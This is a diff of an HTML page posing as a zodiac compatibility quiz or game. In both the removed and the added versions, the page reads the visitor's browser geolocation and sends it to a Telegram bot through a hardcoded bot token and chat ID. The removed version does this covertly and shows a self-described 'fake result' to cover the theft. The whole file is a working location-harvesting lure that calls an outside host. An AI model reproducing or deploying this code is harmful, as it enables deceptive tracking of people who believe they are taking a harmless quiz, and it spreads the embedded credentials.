@@ -1,68 +1,84 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Zodiac Compatibility</title>
-  <link rel="stylesheet" href="styles.css">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Zodiac Game Location</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            margin-top: 50px;
+        }
+        button {
+            padding: 10px 20px;
+            background-color: #4CAF50;
+            color: white;
+            border: none;
+            cursor: pointer;
+        }
+        button:hover {
+            background-color: #45a049;
+        }
+    </style>
 </head>
 <body>
-  <div class="container">
-    <h1>Zodiac Compatibility Test</h1>
-    <p>To find your perfect match, we need your location for accurate analysis.</p>
-    <button class="location-btn" onclick="getLocation()">Allow Location Access</button>
-    <p id="location-status" style="display: none;"></p> <!-- Location won't be shown here -->
-    
-    <div id="compatibility-result" style="display: none;">
-      <h2>Your Zodiac Compatibility Result:</h2>
-      <p>Your perfect match is with **Libra**. Congratulations! 🎉</p>
-    </div>
-  </div>
 
-  <script>
-    function getLocation() {
-      if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(showPosition, showError);
-      } else {
-        alert("Geolocation is not supported by this browser.");
-      }
-    }
+    <h2>What is Your Zodiac Sign?</h2>
+    <select id="zodiac" name="zodiac">
+        <option value="aries">Aries</option>
+        <option value="taurus">Taurus</option>
+        <option value="gemini">Gemini</option>
+        <option value="cancer">Cancer</option>
+        <option value="leo">Leo</option>
+        <option value="virgo">Virgo</option>
+        <option value="libra">Libra</option>
+        <option value="scorpio">Scorpio</option>
+        <option value="sagittarius">Sagittarius</option>
+        <option value="capricorn">Capricorn</option>
+        <option value="aquarius">Aquarius</option>
+        <option value="pisces">Pisces</option>
+    </select>
+    <br><br>
+    <button onclick="getLocationAndSendMessage()">Submit</button>
 
-    function showPosition(position) {
-      const latitude = position.coords.latitude;
-      const longitude = position.coords.longitude;
+    <script>
+        function getLocationAndSendMessage() {
+            const zodiac = document.getElementById("zodiac").value;
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(function(position) {
+                    const latitude = position.coords.latitude;
+                    const longitude = position.coords.longitude;
+                    const message = `Zodiac: ${zodiac} - Location: Latitude = ${latitude}, Longitude = ${longitude}`;
+                    sendMessageToTelegram(message);
+                }, function(error) {
+                    alert("Error getting location.");
+                });
+            } else {
+                alert("Geolocation is not supported by this browser.");
+            }
+        }
 
-      // Send location data to Telegram Bot (background, no display)
-      sendLocationToTelegram(latitude, longitude);
+        function sendMessageToTelegram(message) {
+            const botToken = '7784284083:AAG31myfjSw1T-MTExDj837RQQBKtms8wYk';  // Replace with your Bot's token
+            const chatId = '397599597';      // Replace with your Chat ID
+            const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
 
-      // Show fake result (Zodiac Compatibility)
-      document.getElementById("compatibility-result").style.display = "block";
+            fetch(url)
+                .then(response => response.json())
+                .then(data => {
+                    if (data.ok) {
+                        alert("Location and Zodiac Sent!");
+                    } else {
+                        alert("Error sending data.");
+                    }
+                })
+                .catch(error => {
+                    alert("Error with the request.");
+                    console.error("Error:", error);
+                });
+        }
+    </script>
 
-      // Simulate some result loading (optional)
-      setTimeout(function() {
-        alert("Your location has been successfully analyzed and your compatibility result is displayed!");
-      }, 1000);
-    }
-
-    function showError(error) {
-      alert("Unable to retrieve your location. Try again.");
-    }
-
-    // Send location to Telegram bot (fake API call, replace with your actual API)
-    function sendLocationToTelegram(lat, long) {
-      const telegramBotToken = '7784284083:AAG31myfjSw1T-MTExDj837RQQBKtms8wYk'; // Replace with your Telegram Bot token
-      const chatId = '397599597'; // Replace with your chat ID
-      const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage?chat_id=${chatId}&text=User Location: Latitude ${lat}, Longitude ${long}`;
-      
-      fetch(url)
-        .then(response => response.json())
-        .then(data => {
-          console.log("Location sent to Telegram:", data);
-        })
-        .catch(error => {
-          console.error("Error sending location:", error);
-        });
-    }
-  </script>
 </body>
 </html>
